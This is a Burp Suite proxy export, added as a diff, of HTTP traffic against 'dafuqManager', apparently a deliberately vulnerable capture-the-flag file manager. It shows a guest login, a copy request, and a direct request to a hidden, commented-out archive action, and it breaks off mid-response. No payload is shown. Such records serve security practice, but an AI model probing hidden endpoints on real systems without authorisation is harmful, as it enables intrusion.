@@ -1,0 +1,600 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="1.7.35" exportTime="Mon Nov 26 15:20:05 CST 2018">
+  <item>
+    <time>Mon Nov 26 15:15:47 CST 2018</time>
+    <url><![CDATA[https://dafuq-manager.hackme.inndy.tw/index.php]]></url>
+    <host ip="140.118.126.236">dafuq-manager.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/index.php]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[GET /index.php HTTP/1.1
+Host: dafuq-manager.hackme.inndy.tw
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+If-Modified-Since: Mon, 26 Nov 2018 07:15:29 GMT
+
+]]></request>
+    <status>200</status>
+    <responselength>1700</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 26 Nov 2018 07:15:47 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Set-Cookie: PHPSESSID=cu82k18ttg3tpqjmtvppkoutl2; path=/
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Mon, 26 Nov 2018 07:15:47 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 1299
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>dafuqManager :: Login</title>
+    <link rel="stylesheet" href="style/style.css" media="all">
+</head>
+<body>
+<center>
+<table style="width: 100%;">
+  <tbody>
+    <tr>
+      <td class="title"><div style="margin: .2em 2.5%;">Login</div></td>
+    </tr>
+  </tbody>
+</table>
+
+<BR><TABLE width="300"><TR><TD colspan="2" class="header" nowrap><B>Login to use dafuqManager</B></TD></TR>
+<FORM name="login" action="https://dafuq-manager.hackme.inndy.tw/index.php?action=login&order=name&srt=yes" method="post">
+<TR><TD>Username:</TD><TD align="right"><INPUT name="p_user" type="text" size="25"></TD></TR>
+<TR><TD>Password:</TD><TD align="right"><INPUT name="p_pass" type="password" size="25"></TD></TR>
+<TR><TD>Language:</TD><TD align="right"><SELECT name="lang">
+<OPTION value="cht">￧ﾹﾁ￩ﾫﾔ￤ﾸﾭ￦ﾖﾇ</OPTION>
+<OPTION value="en">English</OPTION>
+
+</SELECT></TD></TR>
+<TR><TD colspan="2" align="right"><INPUT type="submit" value="Login" class="button"></TD></TR>
+</FORM></TABLE><BR>guest / guest for test
+<script language="JavaScript1.2" type="text/javascript">
+<!--
+    if(document.login) document.login.p_user.focus();
+// -->
+</script><hr>
+<small>Hope that you like this damn vulnerable dafuqManager :)</small>
+</center></body>
+</html>]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Mon Nov 26 15:15:57 CST 2018</time>
+    <url><![CDATA[https://dafuq-manager.hackme.inndy.tw/index.php?action=login&order=name&srt=yes]]></url>
+    <host ip="140.118.126.236">dafuq-manager.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/index.php?action=login&order=name&srt=yes]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[POST /index.php?action=login&order=name&srt=yes HTTP/1.1
+Host: dafuq-manager.hackme.inndy.tw
+Connection: close
+Content-Length: 34
+Cache-Control: max-age=0
+Origin: https://dafuq-manager.hackme.inndy.tw
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://dafuq-manager.hackme.inndy.tw/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=cu82k18ttg3tpqjmtvppkoutl2
+
+p_user=guest&p_pass=guest&lang=cht]]></request>
+    <status>200</status>
+    <responselength>13697</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 26 Nov 2018 07:15:57 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Set-Cookie: show_hidden=no; expires=Mon, 26-Nov-2018 08:15:57 GMT; Max-Age=3600
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Mon, 26 Nov 2018 07:15:57 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 12786
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>dafuqManager :: ￧ﾛﾮ￩ﾌﾄ: /</title>
+    <link rel="stylesheet" href="style/style.css" media="all">
+</head>
+<body>
+<center>
+<table style="width: 100%;">
+  <tbody>
+    <tr>
+      <td class="title"><div style="margin: .2em 2.5%;">[guest] - ￧ﾛﾮ￩ﾌﾄ: /</div></td>
+    </tr>
+  </tbody>
+</table>
+
+<script language="JavaScript1.2" type="text/javascript">
+<!--
+    // Checkboxes
+    function Toggle(e) {
+        if(e.checked) {
+            Highlight(e);
+            document.selform.toggleAllC.checked = AllChecked();
+        } else {
+            UnHighlight(e);
+            document.selform.toggleAllC.checked = false;
+        }
+       }
+
+    function ToggleAll(e) {
+        if(e.checked) CheckAll();
+        else ClearAll();
+    }
+    
+    function CheckAll() {
+        var ml = document.selform;
+        var len = ml.elements.length;
+        for(var i=0; i<len; ++i) {
+            var e = ml.elements[i];
+            if(e.name == "selitems[]") {
+                e.checked = true;
+                Highlight(e);
+            }
+        }
+        ml.toggleAllC.checked = true;
+    }
+
+    function ClearAll() {
+        var ml = document.selform;
+        var len = ml.elements.length;
+        for (var i=0; i<len; ++i) {
+            var e = ml.elements[i];
+            if(e.name == "selitems[]") {
+                e.checked = false;
+                UnHighlight(e);
+            }
+        }
+        ml.toggleAllC.checked = false;
+    }
+
+    function AllChecked() {
+        ml = document.selform;
+        len = ml.elements.length;
+        for(var i=0; i<len; ++i) {
+            if(ml.elements[i].name == "selitems[]" && !ml.elements[i].checked) return false;
+        }
+        return true;
+    }
+    
+    function NumChecked() {
+        ml = document.selform;
+        len = ml.elements.length;
+        num = 0;
+        for(var i=0; i<len; ++i) {
+            if(ml.elements[i].name == "selitems[]" && ml.elements[i].checked) ++num;
+        }
+        return num;
+    }
+    
+    
+    // Row highlight
+
+    function Highlight(e) {
+        var r = null;
+        if(e.parentNode && e.parentNode.parentNode) {
+            r = e.parentNode.parentNode;
+        } else if(e.parentElement && e.parentElement.parentElement) {
+            r = e.parentElement.parentElement;
+        }
+        if(r && r.className=="rowdata") {
+            r.className = "rowdatasel";
+        }
+    }
+
+    function UnHighlight(e) {
+        var r = null;
+        if(e.parentNode && e.parentNode.parentNode) {
+            r = e.parentNode.parentNode;
+        } else if (e.parentElement && e.parentElement.parentElement) {
+            r = e.parentElement.parentElement;
+        }
+        if(r && r.className=="rowdatasel") {
+            r.className = "rowdata";
+        }
+    }
+    
+    
+    // Copy / Move / Delete
+    
+    function Copy() {
+        if(NumChecked()==0) {
+            alert("￤ﾽﾠ￦ﾲﾒ￦ﾜﾉ￩ﾁﾸ￦ﾓﾇ￤ﾻﾻ￤ﾽﾕ￩ﾠﾅ￧ﾛﾮ￣ﾀﾂ");
+            return;
+        }
+        document.selform.do_action.value = "copy";
+        document.selform.submit();
+    }
+    
+    function Move() {
+        if(NumChecked()==0) {
+            alert("￤ﾽﾠ￦ﾲﾒ￦ﾜﾉ￩ﾁﾸ￦ﾓﾇ￤ﾻﾻ￤ﾽﾕ￩ﾠﾅ￧ﾛﾮ￣ﾀﾂ");
+            return;
+        }
+        document.selform.do_action.value = "move";
+        document.selform.submit();
+    }
+    
+    function Delete() {
+        num=NumChecked();
+        if(num==0) {
+            alert("￤ﾽﾠ￦ﾲﾒ￦ﾜﾉ￩ﾁﾸ￦ﾓﾇ￤ﾻﾻ￤ﾽﾕ￩ﾠﾅ￧ﾛﾮ￣ﾀﾂ");
+            return;
+        }
+        if(confirm("￤ﾽﾠ￧ﾢﾺ￥ﾮﾚ￤ﾽﾠ￨ﾦﾁ￥ﾈﾪ￩ﾙﾤ￩ﾀﾙ "+num+" ￥ﾀﾋ￦ﾪﾔ￦ﾡﾈ￥ﾗﾎ?")) {
+            document.selform.do_action.value = "delete";
+            document.selform.submit();
+        }
+    }
+    
+    function Archive() {
+        if(NumChecked()==0) {
+            alert("￤ﾽﾠ￦ﾲﾒ￦ﾜﾉ￩ﾁﾸ￦ﾓﾇ￤ﾻﾻ￤ﾽﾕ￩ﾠﾅ￧ﾛﾮ￣ﾀﾂ");
+            return;
+        }
+        document.selform.do_action.value = "arch";
+        document.selform.submit();
+    }
+    
+
+// -->
+</script>
+<BR><TABLE width="95%" class="toolbar"><TR><TD><TABLE><TR>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_up.png" ALT="￤ﾸﾊ￤ﾸﾀ￥ﾱﾤ" TITLE="￤ﾸﾊ￤ﾸﾀ￥ﾱﾤ">￤ﾸﾊ￤ﾸﾀ￥ﾱﾤ</A></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_home.png" ALT="￥ﾮﾶ￧ﾛﾮ￩ﾌﾄ" TITLE="￥ﾮﾶ￧ﾛﾮ￩ﾌﾄ">￥ﾮﾶ￧ﾛﾮ￩ﾌﾄ</A></TD>
+<TD><A HREF="javascript:location.reload();"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_refresh.png" ALT="￩ﾇﾍ￦ﾖﾰ￨ﾼﾉ￥ﾅﾥ" TITLE="￩ﾇﾍ￦ﾖﾰ￨ﾼﾉ￥ﾅﾥ">￩ﾇﾍ￦ﾖﾰ￨ﾼﾉ￥ﾅﾥ</A></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=search&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_search.png" ALT="￦ﾐﾜ￥ﾰﾋ" TITLE="￦ﾐﾜ￥ﾰﾋ">￦ﾐﾜ￥ﾰﾋ</A></TD>
+<TD class="splitter"></TD><TD><A HREF="javascript:Copy();"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_copy.png" ALT="￨ﾤﾇ￨ﾣﾽ" TITLE="￨ﾤﾇ￨ﾣﾽ">￨ﾤﾇ￨ﾣﾽ</A></TD>
+<TD><A HREF="javascript:Move();"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_move.png" ALT="￧ﾧﾻ￥ﾋﾕ" TITLE="￧ﾧﾻ￥ﾋﾕ">￧ﾧﾻ￥ﾋﾕ</A></TD>
+<TD><A HREF="javascript:Delete();"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_delete.png" ALT="￥ﾈﾪ￩ﾙﾤ" TITLE="￥ﾈﾪ￩ﾙﾤ">￥ﾈﾪ￩ﾙﾤ</A></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=upload&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_upload.png" ALT="￤ﾸﾊ￥ﾂﾳ" TITLE="￤ﾸﾊ￥ﾂﾳ">￤ﾸﾊ￥ﾂﾳ</A></TD>
+<!--<TD><A HREF="javascript:Archive();"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_archive.png" ALT="￥ﾣﾓ￧ﾸﾮ￦ﾪﾔ" TITLE="￥ﾣﾓ￧ﾸﾮ￦ﾪﾔ">￥ﾣﾓ￧ﾸﾮ￦ﾪﾔ</A></TD>-->
+<TD class="splitter"></TD><TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=logout&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_logout.png" ALT="￧ﾙﾻ￥ﾇﾺ" TITLE="￧ﾙﾻ￥ﾇﾺ">￧ﾙﾻ￥ﾇﾺ</A></TD>
+</TR></TABLE></TD>
+<TD align="right"><TABLE><FORM action="https://dafuq-manager.hackme.inndy.tw/index.php?action=mkitem&order=name&srt=yes&lang=cht" method="post">
+<TR><TD><SELECT name="mktype"><option value="file">￦ﾪﾔ￦ﾡﾈ</option><option value="dir">￧ﾛﾮ￩ﾌﾄ</option></SELECT>
+<INPUT name="mkname" type="text" size="15"><INPUT type="submit" value="￨ﾣﾽ￩ﾀﾠ" class="button"></TD></TR></FORM></TABLE></TD>
+</TR></TABLE>
+<TABLE class="files" WIDTH="95%"><FORM name="selform" method="POST" action="https://dafuq-manager.hackme.inndy.tw/index.php?action=post&order=name&srt=yes&lang=cht">
+<INPUT type="hidden" name="do_action"><INPUT type="hidden" name="first" value="y">
+<TR class="header"><TD WIDTH="2%" class="header">
+<INPUT TYPE="checkbox" name="toggleAllC" onclick="javascript:ToggleAll(this);"></TD>
+<TD WIDTH="44%" class="header"><B>
+<A href="https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=name&srt=no&lang=cht">￥ﾐﾍ￧ﾨﾱ&nbsp;<IMG width="10" height="10" border="0" align="ABSMIDDLE" src="img/_arrowup.png" ALT="^"></A></B></TD>
+<TD WIDTH="10%" class="header"><B><A href="https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=size&srt=yes&lang=cht">￥ﾤﾧ￥ﾰﾏ</A></B></TD>
+<TD WIDTH="16%" class="header"><B><A href="https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=type&srt=yes&lang=cht">￩ﾡﾞ￥ﾞﾋ</A></B></TD>
+<TD WIDTH="14%" class="header"><B><A href="https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=mod&srt=yes&lang=cht">￦ﾛﾴ￦ﾔﾹ￦ﾗﾥ￦ﾜﾟ</A></B></TD><TD WIDTH="8%" class="header"><B>￦ﾬﾊ￩ﾙﾐ</B>
+</TD><TD WIDTH="6%" class="header"><B>￥ﾋﾕ￤ﾽﾜ</B></TD></TR>
+<TR class="rowdata"><TD><INPUT TYPE="checkbox" name="selitems[]" value="dafuqManager.7z" onclick="javascript:Toggle(this);"></TD>
+<TD nowrap><A HREF="https://dafuq-manager.hackme.inndy.tw/data/guest/dafuqManager.7z" TARGET="_blank"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/file.png" ALT="">&nbsp;dafuqManager.7z</A></TD>
+<TD>40.05 KB</TD>
+<TD>￦ﾪﾔ￦ﾡﾈ</TD>
+<TD>2016/10/04 11:08</TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=chmod&item=dafuqManager.7z&order=name&srt=yes&lang=cht" TITLE="￦ﾛﾴ￦ﾔﾹ￦ﾬﾊ￩ﾙﾐ">-rw-r--r--</A></TD>
+<TD>
+<TABLE>
+<TD><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_.png" ALT=""></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=dafuqManager.7z&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_download.png" ALT="￤ﾸﾋ￨ﾼﾉ" TITLE="￤ﾸﾋ￨ﾼﾉ"></A></TD>
+</TABLE>
+</TD></TR>
+<TR class="rowdata"><TD><INPUT TYPE="checkbox" name="selitems[]" value="index.html" onclick="javascript:Toggle(this);"></TD>
+<TD nowrap><A HREF="https://dafuq-manager.hackme.inndy.tw/data/guest/index.html" TARGET="_blank"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/html.png" ALT="">&nbsp;index.html</A></TD>
+<TD>170 Bytes</TD>
+<TD>HTML ￧ﾶﾲ￩ﾠﾁ</TD>
+<TD>2016/10/03 14:51</TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=chmod&item=index.html&order=name&srt=yes&lang=cht" TITLE="￦ﾛﾴ￦ﾔﾹ￦ﾬﾊ￩ﾙﾐ">-rw-r--r--</A></TD>
+<TD>
+<TABLE>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=index.html&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_edit.png" ALT="￧ﾷﾨ￨ﾼﾯ" TITLE="￧ﾷﾨ￨ﾼﾯ"></A></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=index.html&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_download.png" ALT="￤ﾸﾋ￨ﾼﾉ" TITLE="￤ﾸﾋ￨ﾼﾉ"></A></TD>
+</TABLE>
+</TD></TR>
+<TR class="rowdata"><TD><INPUT TYPE="checkbox" name="selitems[]" value="see-me-if-you-need-tips.txt" onclick="javascript:Toggle(this);"></TD>
+<TD nowrap><A HREF="https://dafuq-manager.hackme.inndy.tw/data/guest/see-me-if-you-need-tips.txt" TARGET="_blank"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/txt.png" ALT="">&nbsp;see-me-if-you-need-tips.txt</A></TD>
+<TD>65 Bytes</TD>
+<TD>￦ﾖﾇ￥ﾭﾗ￦ﾪﾔ￦ﾡﾈ</TD>
+<TD>2016/10/04 05:09</TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=chmod&item=see-me-if-you-need-tips.txt&order=name&srt=yes&lang=cht" TITLE="￦ﾛﾴ￦ﾔﾹ￦ﾬﾊ￩ﾙﾐ">-rw-r--r--</A></TD>
+<TD>
+<TABLE>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=see-me-if-you-need-tips.txt&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_edit.png" ALT="￧ﾷﾨ￨ﾼﾯ" TITLE="￧ﾷﾨ￨ﾼﾯ"></A></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=see-me-if-you-need-tips.txt&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_download.png" ALT="￤ﾸﾋ￨ﾼﾉ" TITLE="￤ﾸﾋ￨ﾼﾉ"></A></TD>
+</TABLE>
+</TD></TR>
+<TR class="rowdata"><TD><INPUT TYPE="checkbox" name="selitems[]" value="source-code-in-dafuqManager.7z-please-download-it.txt" onclick="javascript:Toggle(this);"></TD>
+<TD nowrap><A HREF="https://dafuq-manager.hackme.inndy.tw/data/guest/source-code-in-dafuqManager.7z-please-download-it.txt" TARGET="_blank"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/txt.png" ALT="">&nbsp;source-code-in-dafuqManager.7z-please-download-...</A></TD>
+<TD>-</TD>
+<TD>￦ﾖﾇ￥ﾭﾗ￦ﾪﾔ￦ﾡﾈ</TD>
+<TD>2016/10/04 11:13</TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=chmod&item=source-code-in-dafuqManager.7z-please-download-it.txt&order=name&srt=yes&lang=cht" TITLE="￦ﾛﾴ￦ﾔﾹ￦ﾬﾊ￩ﾙﾐ">-rw-r--r--</A></TD>
+<TD>
+<TABLE>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=source-code-in-dafuqManager.7z-please-download-it.txt&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_edit.png" ALT="￧ﾷﾨ￨ﾼﾯ" TITLE="￧ﾷﾨ￨ﾼﾯ"></A></TD>
+<TD><A HREF="https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=source-code-in-dafuqManager.7z-please-download-it.txt&order=name&srt=yes&lang=cht"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_download.png" ALT="￤ﾸﾋ￨ﾼﾉ" TITLE="￤ﾸﾋ￨ﾼﾉ"></A></TD>
+</TABLE>
+</TD></TR>
+<TR class="footer">
+<TD class="header"></TD><TD class="header">4 ￥ﾀﾋ￩ﾠﾅ￧ﾛﾮ (￥ﾉﾩ￩ﾤﾘ: 7.29 GB)</TD>
+<TD class="header">40.28 KB</TD>
+<TD class="header"></TD><TD class="header"></TD><TD class="header"></TD><TD class="header"></TD></FORM></TABLE>
+<script language="JavaScript1.2" type="text/javascript">
+<!--
+    // Uncheck all items (to avoid problems with new items)
+    var ml = document.selform;
+    var len = ml.elements.length;
+    for(var i=0; i<len; ++i) {
+        var e = ml.elements[i];
+        if(e.name == "selitems[]" && e.checked == true) {
+            e.checked=false;
+        }
+    }
+// -->
+</script><hr>
+<small>Hope that you like this damn vulnerable dafuqManager :)</small>
+</center></body>
+</html>]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Mon Nov 26 15:16:05 CST 2018</time>
+    <url><![CDATA[https://dafuq-manager.hackme.inndy.tw/index.php?action=post&order=name&srt=yes&lang=cht]]></url>
+    <host ip="140.118.126.236">dafuq-manager.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/index.php?action=post&order=name&srt=yes&lang=cht]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[POST /index.php?action=post&order=name&srt=yes&lang=cht HTTP/1.1
+Host: dafuq-manager.hackme.inndy.tw
+Connection: close
+Content-Length: 53
+Cache-Control: max-age=0
+Origin: https://dafuq-manager.hackme.inndy.tw
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://dafuq-manager.hackme.inndy.tw/index.php?action=login&order=name&srt=yes
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=cu82k18ttg3tpqjmtvppkoutl2; show_hidden=no
+
+do_action=copy&first=y&selitems%5B%5D=dafuqManager.7z]]></request>
+    <status>200</status>
+    <responselength>2285</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 26 Nov 2018 07:16:06 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Mon, 26 Nov 2018 07:16:06 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 1942
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>dafuqManager :: ￨ﾤﾇ￨ﾣﾽ￩ﾠﾅ￧ﾛﾮ</title>
+    <link rel="stylesheet" href="style/style.css" media="all">
+</head>
+<body>
+<center>
+<table style="width: 100%;">
+  <tbody>
+    <tr>
+      <td class="title"><div style="margin: .2em 2.5%;">[guest] - ￨ﾤﾇ￨ﾣﾽ￩ﾠﾅ￧ﾛﾮ</div></td>
+    </tr>
+  </tbody>
+</table>
+
+<script language="JavaScript1.2" type="text/javascript">
+    function NewDir(newdir) {
+        document.selform.new_dir.value = newdir;
+        document.selform.submit();
+    }
+
+    function Execute() {
+        document.selform.confirm.value = "true";
+    }
+</script>
+<BR><IMG SRC="img/__copy.png" align="ABSMIDDLE" ALT="">&nbsp;￥ﾾﾞ / ￨ﾤﾇ￨ﾣﾽ￥ﾈﾰ / <IMG SRC="img/__paste.png" align="ABSMIDDLE" ALT="">
+<BR><BR><FORM name="selform" method="post" action="https://dafuq-manager.hackme.inndy.tw/index.php?action=post&order=name&srt=yes&lang=cht"><TABLE>
+<INPUT type="hidden" name="do_action" value="copy">
+<INPUT type="hidden" name="confirm" value="false">
+<INPUT type="hidden" name="first" value="n">
+<INPUT type="hidden" name="new_dir" value="">
+<TR><TD><A HREF="javascript:NewDir('');"><IMG border="0" width="16" height="16" align="ABSMIDDLE" src="img/_up.png" ALT="">&nbsp;..</A></TD></TR>
+</TABLE><BR><TABLE>
+<TR><TD><IMG SRC="img/_info.png" align="ABSMIDDLE" ALT=""><INPUT type="hidden" name="selitems[]" value="dafuqManager.7z">&nbsp;dafuqManager.7z&nbsp;</TD><TD><INPUT type="text" size="25" name="newitems[]" value="dafuqManager.7z"></TD></TR>
+</TABLE><BR><TABLE><TR>
+<TD><INPUT type="submit" value="￨ﾤﾇ￨ﾣﾽ" onclick="javascript:Execute();" class="button"></TD>
+<TD><input type="button" value="￥ﾏﾖ￦ﾶﾈ" onClick="javascript:location='https://dafuq-manager.hackme.inndy.tw/index.php?action=list&order=name&srt=yes&lang=cht';" class="button"></TD>
+</TR></FORM></TABLE><BR>
+<hr>
+<small>Hope that you like this damn vulnerable dafuqManager :)</small>
+</center></body>
+</html>]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Mon Nov 26 15:16:11 CST 2018</time>
+    <url><![CDATA[https://dafuq-manager.hackme.inndy.tw/index.php?action=arch]]></url>
+    <host ip="140.118.126.236">dafuq-manager.hackme.inndy.tw</host>
+    <port>443</port>
+    <protocol>https</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/index.php?action=arch]]></path>
+    <extension>php</extension>
+    <request base64="false"><![CDATA[GET /index.php?action=arch HTTP/1.1
+Host: dafuq-manager.hackme.inndy.tw
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=cu82k18ttg3tpqjmtvppkoutl2; show_hidden=no
+If-Modified-Since: Mon, 26 Nov 2018 07:09:39 GMT
+
+]]></request>
+    <status>200</status>
+    <responselength>1578</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 26 Nov 2018 07:16:12 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Mon, 26 Nov 2018 07:16:12 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Strict-Transport-Security: max-age=15768000
+Content-Length: 1235
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>dafuqManager :: Archive item(s)</title>
+    <link rel="stylesheet" href="style/style.css" media="all">
+</head>
+<body>
+<center>
+<table style="width: 100%;">
+  <tbody>
+    <tr>
+      <td class="title"><div style="margin: .2em 2.5%;">[guest] - Archive item(s)</div></td>
+    </tr>
+  </tbody>
+</table>
+
+<BR><FORM name="archform" method="post" action="https://dafuq-manager.hackme.inndy.tw/index.php?action=arch&order=name&srt=yes">
